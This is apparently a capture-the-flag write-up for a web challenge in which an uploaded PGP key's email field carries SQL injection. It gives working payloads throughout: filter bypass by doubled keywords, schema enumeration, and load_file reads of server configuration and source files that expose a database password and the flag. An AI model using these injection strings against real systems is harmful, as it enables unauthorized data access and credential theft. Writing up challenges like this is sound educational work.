We need to upload a PGP public key file so the website will parse it.
The PGP can contain an SQLi in the email field. Michael A. wrote a script to make everything easier, 
The trick will now be the SQLi itself.

At first, we thought about fetching the users so we could use an activated user perhaps. 
To do this we must first find which table stores them.

## Basic SQLi
The server doesn't sanitize ', so we can just easily inject code.
However, the server does sanitize "union" and "select" among some special characters - the easiest way to check is entering 
a valid SQL query with testing AFTER the comment.

for instance the query

  email = "A' or 1 # union select ()<>?!%= "

Will return something along 
	"A' or 1 #<" 
(so just < isn't sanitized here)

**Incidentily every character is sanitized only once**, so

  email = "A' or 1 # == "

will return

  "A' or 1 # = "

## Getting the users table/columns (Ultimately not useful)  
[This](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet1 
) cheatsheet contains a lot of useful queries, like how to get a list of the tables and of columns:

To get (All) the tables we use:

  ```email = "A' UNunionION SELselectECT table_name,1,1,1,1 FROM information_schema.tables # "```

"table_name" has to be first, because only the first column is shown to the user.

The last table in the response is :

```"information_schema.tables # </br>[different key]</br>
(accounts) A' UNION SELECT table_name,1,1,1,1 FROM"```

So we can see the table name is "accounts"

To get all the coulmns from all of the tables we use:


  email = "A' UNunionION SELselectECT column_name,1,1,1,1 FROM information_schema.columns # "
  
Which returns 

 ```information_schema.columns # </br>[different key]</br>
(path) A' UNION SELECT column_name,1,1,1,1 FROM information_schema.columns # </br>[different key]</br>
(user_id) A' UNION SELECT column_name,1,1,1,1 FROM information_schema.columns # </br>[different key]</br>
(pass) A' UNION SELECT column_name,1,1,1,1 FROM information_schema.columns # </br>[different key]</br>
(activated) A' UNION SELECT column_name,1,1,1,1 FROM information_schema.columns # </br>[different key]</br>```


Too bad there are no activated users, which can be verified with 

  ```email = "A' UNunionION SELselectECT activated,1,1,1,1 FROM accounts"```

Trying to insert an activated user or to update one also didn't work...

## Solution

The main page says the Prof. likes snakes, which implies the website is written in python, so maybe we can inject a command.
We're interested in the source code, but to know where it is we need to check lighttpd.conf first - because the website is powered by lighttpd.
We can't deliver straight ASCII, because we might have characters which will bang the SQL query.

To verify I can read files I started with '/bin/ls' which is always there

```email = "A' UNunionION SELselectECT ()open('/bin/ls').read().encode('hex'),1,1,1,1 #"```

That didn't work... maybe it isn't written in python?
Let's try to visit 

http://104.198.80.195/public/index.py - Nope!

maybe

http://104.198.80.195/public/index.php - Nope :(

http://104.198.80.195/public/index.pl - It works!

So the index page is written in perl.

And to get the configuration we can use the following query:

```email = "A' UNunionION SELselectECT ()hex(load_file('/etc/lighttpd/lighttpd.conf')),1,1,1,1 #"```

Which contains the name of our index page, to get it we use:

```email = "A' UNunionION SELselectECT ()hex(load_file('/var/www/html/public/index.pl')),1,1,1,1 #"```

Inside we can see that the flag is loaded from '../private/config.ini', so we get the flag:

```email = "A' UNunionION SELselectECT ()hex(load_file('/var/www/html/private/config.ini')),1,1,1,1 #"```

which gives us:

[Database] Password=BlulS@ablul [CTF] Flag=ILov3P3rl43v3r


